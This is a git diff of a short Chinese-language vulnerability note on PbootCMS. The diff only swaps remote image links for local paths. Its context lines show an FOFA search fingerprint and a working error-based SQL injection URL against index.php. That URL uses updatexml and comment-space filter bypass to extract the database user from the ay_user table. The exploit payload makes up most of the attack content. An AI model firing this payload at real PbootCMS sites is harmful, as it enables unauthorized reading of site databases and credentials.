@@ -20,7 +20,7 @@ app="PBOOTCMS"
 
 主页
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170926840.png)
+![](./images/202202170926840.png)
 
 测试 Payload
 
@@ -28,4 +28,4 @@ app="PBOOTCMS"
 /index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170926157.png)
+![](./images/202202170926157.png)
